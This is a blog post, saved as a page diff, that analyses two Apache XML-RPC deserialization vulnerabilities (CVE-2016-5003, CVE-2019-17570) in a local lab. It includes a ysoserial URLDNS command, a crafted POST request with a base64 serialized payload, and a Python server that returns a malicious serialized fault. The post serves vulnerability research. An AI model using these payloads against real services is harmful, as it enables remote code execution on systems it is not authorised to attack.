@@ -1,0 +1,428 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XML-RPC反序列化漏洞 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XML-RPC反序列化漏洞XML-RPCXml-RPC是一个远程过程调用（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用HTTP协议作为传送机制。 CVE-2016-5003环境搭建： 起一个Maven项目导入下面依赖： &lt;dependencies&gt;       &lt;dependency&gt;         &lt;gro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XML-RPC反序列化漏洞">
+<meta property="og:url" content="http://example.com/2023/12/08/XML-RPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="XML-RPC反序列化漏洞XML-RPCXml-RPC是一个远程过程调用（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用HTTP协议作为传送机制。 CVE-2016-5003环境搭建： 起一个Maven项目导入下面依赖： &lt;dependencies&gt;       &lt;dependency&gt;         &lt;gro">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-r75kyw_1920x1080.png">
+<meta property="article:published_time" content="2023-12-08T05:42:34.000Z">
+<meta property="article:modified_time" content="2023-12-09T11:28:48.207Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-r75kyw_1920x1080.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2023/12/08/XML-RPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XML-RPC反序列化漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-12-09 19:28:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-r75kyw_1920x1080.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XML-RPC反序列化漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-08T05:42:34.000Z" title="发表于 2023-12-08 13:42:34">2023-12-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-09T11:28:48.207Z" title="更新于 2023-12-09 19:28:48">2023-12-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XML-RPC反序列化漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XML-RPC反序列化漏洞"><a href="#XML-RPC反序列化漏洞" class="headerlink" title="XML-RPC反序列化漏洞"></a>XML-RPC反序列化漏洞</h1><h2 id="XML-RPC"><a href="#XML-RPC" class="headerlink" title="XML-RPC"></a>XML-RPC</h2><p>Xml-RPC是一个远程过程调用（remote procedure call，RPC)的分布式计算协议，通过XML将调用函数封装，并使用HTTP协议作为传送机制。</p>
+<h2 id="CVE-2016-5003"><a href="#CVE-2016-5003" class="headerlink" title="CVE-2016-5003"></a>CVE-2016-5003</h2><p>环境搭建：</p>
+<p>起一个Maven项目导入下面依赖：</p>
+<pre><code class="xml">&lt;dependencies&gt;  
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.xmlrpc&lt;/groupId&gt;
+        &lt;artifactId&gt;xmlrpc-common&lt;/artifactId&gt;
+        &lt;version&gt;3.1.3&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.apache.xmlrpc&lt;/groupId&gt;
+        &lt;artifactId&gt;xmlrpc-server&lt;/artifactId&gt;
+        &lt;version&gt;3.1.3&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<p>起一个服务端：</p>
+<pre><code class="java">import org.apache.xmlrpc.server.PropertyHandlerMapping;
+import org.apache.xmlrpc.server.XmlRpcServer;
+import org.apache.xmlrpc.server.XmlRpcServerConfigImpl;
+import org.apache.xmlrpc.webserver.WebServer;
+
+public class Main &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+        WebServer webServer = new WebServer(80);//服务端口
+        XmlRpcServer xmlRpcServer = webServer.getXmlRpcServer();
+        PropertyHandlerMapping phm = new PropertyHandlerMapping();
+        phm.addHandler(&quot;Test&quot;, Test.class);
+        xmlRpcServer.setHandlerMapping(phm);
+        XmlRpcServerConfigImpl serverConfig = (XmlRpcServerConfigImpl) xmlRpcServer.getConfig();
+        serverConfig.setEnabledForExtensions(true);
+        webServer.start();
+    &#125;
+&#125;
+</code></pre>
+<p>其中Test类是被远程调用的类</p>
+<pre><code class="java">public class Test &#123;
+    public String welcome(String name) &#123;
+        return &quot;welcome &quot; + name;
+    &#125;
+&#125;
+</code></pre>
+<p>要远程调用这个Test类的welcome方法，只需要以POST的方式向服务端发起请求，请求的数据为xml：</p>
+<pre><code class="xml">POST / HTTP/1.0
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36
+Host: 127.0.0.1:80
+Content-Type: text/xml
+Content-Length: 192
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall&gt;
+    &lt;methodName&gt;Test.welcome&lt;/methodName&gt;
+    &lt;params&gt;
+        &lt;param&gt;
+            &lt;value&gt;111111111&lt;/value&gt;
+        &lt;/param&gt;
+    &lt;/params&gt;
+&lt;/methodCall&gt;
+</code></pre>
+<p>response:</p>
+<pre><code class="xml">HTTP/1.0 200 OK
+Server: Apache XML-RPC 1.0
+Connection: close
+Content-Type: text/xml
+Content-Length: 196
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse xmlns:ex=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;
+    &lt;params&gt;
+        &lt;param&gt;
+            &lt;value&gt;welcome 111111111&lt;/value&gt;
+        &lt;/param&gt;
+    &lt;/params&gt;
+&lt;/methodResponse&gt;
+</code></pre>
+<p><strong>重点</strong>：这里的XML还支持其他标签，其中就包括了ex:serializable，官方文档的描述如下：一个对象被转换为序列化表示，并作为经过 base 64 编码的字节数组进行传输。其中前缀“ex”指的是命名空间 URI <a target="_blank" rel="noopener" href="http://ws.apache.org/xmlrpc/namespaces/extensions%E3%80%82">http://ws.apache.org/xmlrpc/namespaces/extensions。</a></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231208180051506.png" alt="image-20231208180051506"></p>
+<p>也就是说下面标签内的内容会被base64解密并进行反序列化</p>
+<pre><code class="xml">&lt;ex:serializable&gt;base64code&lt;/serializable&gt;
+</code></pre>
+<p>可以试一试URLDNS，测试一下是否存在反序列化漏洞</p>
+<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://0529a07b.dnslog.store.&quot; &gt; 1.txt
+</code></pre>
+<p>再使用certutil -encode命令进行base64加密</p>
+<pre><code>certutil -encode 1.txt 2.txt
+</code></pre>
+<p>将加密后的内容包裹在<code>&lt;ex:serializable&gt;&lt;/ex:serializable&gt;</code>中</p>
+<pre><code class="tex">POST / HTTP/1.0
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36
+Host: 127.0.0.1:80
+Content-Type: text/xml
+Content-Length: 3133
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;methodCall xmlns:ex=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;
+    &lt;methodName&gt;Test.welcome&lt;/methodName&gt;
+    &lt;params&gt;
+        &lt;param&gt;
+            &lt;value&gt;&lt;ex:serializable&gt;
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rv
+ckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVS
+TJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGph
+dmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9j
+b2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAFjA1MjlhMDdiLmRuc2xvZy5z
+dG9yZS50AABxAH4ABXQABGh0dHBweHQAHWh0dHA6Ly8wNTI5YTA3Yi5kbnNsb2cu
+c3RvcmUueA==
+&lt;/ex:serializable&gt;&lt;/value&gt;
+        &lt;/param&gt;
+    &lt;/params&gt;
+&lt;/methodCall&gt;
+</code></pre>
+<p>测试结果：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209135342773.png" alt="image-20231209135342773"></p>
+<p>说明存在反序列化漏洞</p>
+<p>下一步就是调试一下看看漏洞出现在哪</p>
+<p>当发送数据包后，回调用org.apache.xmlrpc.server.XmlRpcStreamServer中的execute方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209154421443.png" alt="image-20231209154421443"></p>
+<p>将数据流保存到了istream中并传入到getRequest中进行解析</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209154845748.png" alt="image-20231209154845748"></p>
+<p>后面就是一连串的parse方法的调用，调用栈如下：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209155008936.png" alt="image-20231209155008936"></p>
+<p>然后在最后的parse方法中返回的时候调用了com.sun.org.apache.xerces.internal.impl.scanDocument方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209155323582.png" alt="image-20231209155323582"></p>
+<p>在这个方法中会对XML内容进行解析</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209160147362.png" alt="image-20231209160147362"></p>
+<p>扫描完成后调用scanEndElement()方法，在com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl类中</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209160349232.png" alt="image-20231209160349232"></p>
+<p>然后，进入判断，调用了com.sun.org.apache.xerces.internal.parsers.AbstractSAXParser的endElement方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209160654428.png" alt="image-20231209160654428"></p>
+<p>继续跟进下一个endElement方法，这里会获取到xml各个元素的值</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209161016908.png" alt="image-20231209161016908"></p>
+<p>当level&#x3D;&#x3D;3时即获取到最后的元素时，进入endValueTag方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209161146025.png" alt="image-20231209161146025"></p>
+<p>然后因为typeParser 不为空，进入else分支，跟进getResult()方法</p>
+<pre><code class="java">public Object getResult() throws XmlRpcException &#123;
+        try &#123;
+            byte[] res = (byte[])((byte[])super.getResult());
+            ByteArrayInputStream bais = new ByteArrayInputStream(res);
+            ObjectInputStream ois = new ObjectInputStream(bais);
+            return ois.readObject();
+        &#125; catch (IOException var4) &#123;
+            throw new XmlRpcException(&quot;Failed to read result object: &quot; + var4.getMessage(), var4);
+        &#125; catch (ClassNotFoundException var5) &#123;
+            throw new XmlRpcException(&quot;Failed to load class for result object: &quot; + var5.getMessage(), var5);
+        &#125;
+    &#125;
+</code></pre>
+<p>这里直接进行反序列化了</p>
+<h2 id="CVE-2019-17570"><a href="#CVE-2019-17570" class="headerlink" title="CVE-2019-17570"></a>CVE-2019-17570</h2><p>这个也是个反序列化漏洞，漏洞点在org.apache.xmlrpc.parser.XmlRpcResponseParser类的addResult方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209170930354.png" alt="image-20231209170930354"></p>
+<p>这个类是处理服务器返回的数据，作为客户端使用时程序会运行到这：</p>
+<p>首先添加依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.xmlrpc&lt;/groupId&gt;
+    &lt;artifactId&gt;xmlrpc-client&lt;/artifactId&gt;
+    &lt;version&gt;3.1.3&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>写个客户端：</p>
+<pre><code class="java">public static void main(String[] args) throws MalformedURLException, XmlRpcException &#123;
+    String domainName = &quot;http://127.0.0.1:8888&quot;;
+
+    String serverurl = domainName + &quot;/&quot;;
+    XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl();
+    config.setServerURL(new URL(serverurl));
+    XmlRpcClient client = new XmlRpcClient();
+    client.setConfig(config);
+    Object[] params = new Object[]&#123;&quot;test&quot;, &quot;AAA&quot;&#125;;
+    Object result = (Object) client.execute(&quot;xmlrpc-api&quot;, params);
+&#125;
+</code></pre>
+<p>使用python写个简单的服务端，发送恶意返回包：</p>
+<pre><code class="python">import http.server
+import socketserver
+
+def create_fault_deser(payload):
+  return b&#39;&#39;&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;methodResponse xmlns:ex=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;
+  &lt;fault&gt;
+    &lt;value&gt;
+      &lt;struct&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCode&lt;/name&gt;
+          &lt;value&gt;&lt;int&gt;1337&lt;/int&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultString&lt;/name&gt;
+          &lt;value&gt;&lt;string&gt;You have been pwned&lt;/string&gt;&lt;/value&gt;
+        &lt;/member&gt;
+        &lt;member&gt;
+          &lt;name&gt;faultCause&lt;/name&gt;
+          &lt;value&gt;&lt;base64&gt;%s&lt;/base64&gt;&lt;/value&gt;
+        &lt;/member&gt;
+      &lt;/struct&gt;
+    &lt;/value&gt;
+  &lt;/fault&gt;
+&lt;/methodResponse&gt;
+&#39;&#39;&#39; % (payload).encode(&#39;utf-8&#39;)
+
+payload = base64加密后的序列化数据
+
+class Handler(http.server.SimpleHTTPRequestHandler):
+  def do_POST(self):
+    self.send_response(200)
+    self.send_header(&#39;Content-Type&#39;, &#39;text/xml&#39;)
+    self.end_headers()
+
+    self.wfile.write(create_fault_deser(payload))
+
+httpd = socketserver.TCPServer((&#39;0.0.0.0&#39;, 8888), Handler)
+httpd.serve_forever()
+</code></pre>
+<p>启动服务端后，通过java的客户端访问，这个服务器，然后就会去反序列化解密后的payload</p>
+<p>简单的分析一下</p>
+<p>这个过程和上面CVE-2016-5003处理XML的过程是类似的，都是遍历XML获取里面的值然后保存起来，这里保存到的是HashMap对象中</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209190524146.png" alt="image-20231209190524146"></p>
+<p>其中faultCause对应的值就是序列化数据</p>
+<p>往下，因为this.isSuccess&#x3D;false 进入else分支，一直往下：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20231209190920177.png" alt="image-20231209190920177"></p>
+<p>这里获取到了faultCause的值，然后进行反序列化</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/12/08/XML-RPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">http://example.com/2023/12/08/XML-RPC反序列化漏洞/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-r75kyw_1920x1080.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/11/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="Spring内存马"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-md1j61_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Spring内存马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/15/C3P0/" title="C3P0"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-15</div><div class="title">C3P0</div></div></a></div><div><a href="/2023/09/11/CommonsBeanutils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CommonsBeanutils反序列化"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-qzmlj5_2560x1600.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-11</div><div class="title">CommonsBeanutils反序列化</div></div></a></div><div><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">CommonCollections1</div></div></a></div><div><a href="/2023/06/23/CommonsCollections2/" title="CommonsCollections2"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-yjvgzd_2560x1600.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-23</div><div class="title">CommonsCollections2</div></div></a></div><div><a href="/2023/08/02/Commons-Collections%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%90%88%E9%9B%86/" title="Commons-Collections反序列化链合集"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/wallhaven-j3eemp_2560x1440.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-02</div><div class="title">Commons-Collections反序列化链合集</div></div></a></div><div><a href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-06</div><div class="title">CommonsCollections6</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML-RPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">XML-RPC反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML-RPC"><span class="toc-number">1.1.</span> <span class="toc-text">XML-RPC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-5003"><span class="toc-number">1.2.</span> <span class="toc-text">CVE-2016-5003</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-17570"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2019-17570</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/08/XML-RPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="XML-RPC反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-r75kyw_1920x1080.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="XML-RPC反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/12/08/XML-RPC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="XML-RPC反序列化漏洞">XML-RPC反序列化漏洞</a><time datetime="2023-12-08T05:42:34.000Z" title="发表于 2023-12-08 13:42:34">2023-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="Spring内存马"><img src="https://raw.githubusercontent.com/todis21/image/main/2023/wallhaven-md1j61_2560x1440.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Spring内存马"/></a><div class="content"><a class="title" href="/2023/11/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/" title="Spring内存马">Spring内存马</a><time datetime="2023-11-06T02:42:31.000Z" title="发表于 2023-11-06 10:42:31">2023-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/20/Code-Breaking-Puzzles/" title="Code-Breaking Puzzles"><img 